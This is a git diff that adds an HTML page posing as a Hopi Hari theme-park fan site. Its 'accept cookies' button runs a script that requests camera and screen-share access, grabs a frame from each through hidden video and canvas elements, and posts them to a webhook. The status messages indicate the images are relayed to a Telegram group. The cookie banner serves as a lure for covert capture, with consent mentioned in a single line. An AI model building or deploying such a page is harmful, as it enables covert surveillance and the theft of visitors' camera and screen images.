@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hopi Hari Style Site</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background-color: #003366;
+            color: white;
+            padding: 10px 0;
+            text-align: center;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .banner {
+            background-image: url('https://via.placeholder.com/1200x300');
+            background-size: cover;
+            background-position: center;
+            height: 300px;
+            position: relative;
+        }
+        .banner h1 {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 3em;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        .content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+        }
+        #cookieConsent {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            z-index: 1000;
+        }
+        video, canvas {
+            display: none;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Bem-vindo ao Hopi Hari Style Site</h1>
+    </header>
+    <div class="container">
+        <div class="banner">
+            <h1>Diversão Garantida!</h1>
+        </div>
+        <div class="content">
+            <p>Seja bem-vindo ao nosso site inspirado no Hopi Hari! Aqui você encontra tudo sobre nossos brinquedos, atrações e muito mais.</p>
+            <p><strong>⚠️ Importante:</strong> Ao aceitar os cookies, você autoriza o acesso à câmera e à tela para envio ao Telegram.</p>
+        </div>
+        
+        <!-- Status messages -->
+        <div id="status" class="status"></div>
+    </div>
+    
+    <div id="cookieConsent">
+        Este site usa cookies para melhorar sua experiência. <button id="acceptCookies">Aceitar Cookies</button>
+    </div>
+    
+    <!-- Elementos ocultos para captura -->
+    <video id="video" width="640" height="480" autoplay playsinline></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        document.getElementById('acceptCookies').addEventListener('click', async function() {
+            document.getElementById('cookieConsent').style.display = 'none';
+            await requestPermissions();
+        });
+
+        async function requestPermissions() {
+            showStatus('Solicitando permissões...', 'info');
+            
+            try {
+                // 1️⃣ Solicitar acesso à câmera
+                showStatus('📸 Solicitando acesso à câmera...', 'info');
+                const photoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 640, 
+                        height: 480 
+                    } 
+                });
+                
+                // 2️⃣ Solicitar acesso à tela
+                showStatus('🖥️ Solicitando acesso à tela...', 'info');
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: {
+                        width: 640,
+                        height: 480
+                    }
+                });
+
+                showStatus('✅ Permissões concedidas! Capturando imagens...', 'info');
+
+                // 3️⃣ Capturar as imagens
+                const photoBase64 = await captureImage(photoStream, 'photo');
+                const screenBase64 = await captureImage(screenStream, 'screen');
+
+                // 4️⃣ Enviar para o servidor
+                showStatus('📤 Enviando imagens para o Telegram...', 'info');
+                
+                const response = await fetch('http://localhost:3000/webhook', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        photo: photoBase64, 
+                        screen: screenBase64 
+                    })
+                });
+
+                if (response.ok) {
+                    const result = await response.json();
+                    showStatus('✅ Imagens enviadas com sucesso! Agora vá no Telegram do grupo e use /foto ou /print', 'success');
+                } else {
+                    throw new Error('Erro ao enviar para o servidor');
+                }
+
+                // 5️⃣ Parar as streams
+                photoStream.getTracks().forEach(track => track.stop());
+                screenStream.getTracks().forEach(track => track.stop());
+
+            } catch (err) {
+                console.error('Erro detalhado:', err);
+                showStatus('❌ Erro: ' + err.message, 'error');
+            }
+        }
+
+        function captureImage(stream, type) {
+            return new Promise((resolve) => {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+
+                video.srcObject = stream;
+                
+                // Esperar o vídeo carregar
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    // Esperar um pouco para garantir que o vídeo está tocando
+                    setTimeout(() => {
+                        // Desenhar o frame atual no canvas
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        // Converter para base64
+                        const base64 = canvas.toDataURL('image/png').split(',')[1];
+                        console.log(`✅ ${type} capturada com sucesso`);
+                        resolve(base64);
+                    }, 500);
+                };
+            });
+        }
+
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.display = 'block';
+            statusDiv.className = 'status ' + (type === 'error' ? 'error' : type === 'success' ? 'success' : '');
+            statusDiv.innerHTML = message;
+        }
+    </script>
+</body>
+</html>
